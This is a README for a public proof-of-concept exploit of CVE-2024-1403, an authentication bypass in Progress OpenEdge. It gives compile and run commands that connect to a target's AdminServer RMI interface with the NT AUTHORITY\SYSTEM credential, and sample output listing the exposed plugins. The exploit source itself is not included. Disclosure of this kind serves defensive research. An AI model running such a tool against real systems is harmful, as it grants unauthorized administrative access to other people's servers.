# CVE-2024-1403 Progress OpenEdge Authentication Bypass
An exploit proof of concept for Progress OpenEdge CVE-2024-1403.

## Blog Post
More details here:
[https://www.horizon3.ai/attack-research/cve-2024-1403-progress-openedge-authentication-bypass-deep-dive](https://www.horizon3.ai/attack-research/cve-2024-1403-progress-openedge-authentication-bypass-deep-dive)

## Usage
You must provide your own versions of the following jars:
- `progress.jar`
- `oeauth-12.8.-.jar`
- `osmetrics.jar`
- `juniper.jar`

### Compilation
```
$ javac -cp progress.jar:oeauth-12.8.0.jar Main.java

```
### Usage
Running this script will attempt to connect to the `AdminServer` RMI interface using the `NT AUTHORITY\SYSTEM` credential.
```
$ java -cp progress.jar:oeauth-12.8.0.jar:osmetrics.jar:juniper.jar:. Main <target_ip>
com.progress.system.SystemPlugIn
	com.progress.chimera.common.IChimeraRemoteObject
	com.progress.system.ISystemPlugIn

com.progress.agent.database.AgentPlugIn
	com.progress.chimera.common.IChimeraRemoteObject
	com.progress.agent.database.IAgentPlugIn

com.progress.ubroker.tools.NSRemoteObject
	com.progress.chimera.common.IChimeraHierarchy
	com.progress.ubroker.tools.IYodaRMI
	com.progress.ubroker.tools.IYodaSharedResources

com.progress.ubroker.tools.UBRemoteCommand
	com.progress.chimera.common.IChimeraRemoteCommand

com.progress.juniper.admin.JAPlugIn
	com.progress.chimera.common.IChimeraRemoteObject
	com.progress.juniper.admin.IJAPlugIn

com.progress.agent.smdatabase.SMPlugIn
	com.progress.chimera.common.IChimeraRemoteObject
```

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
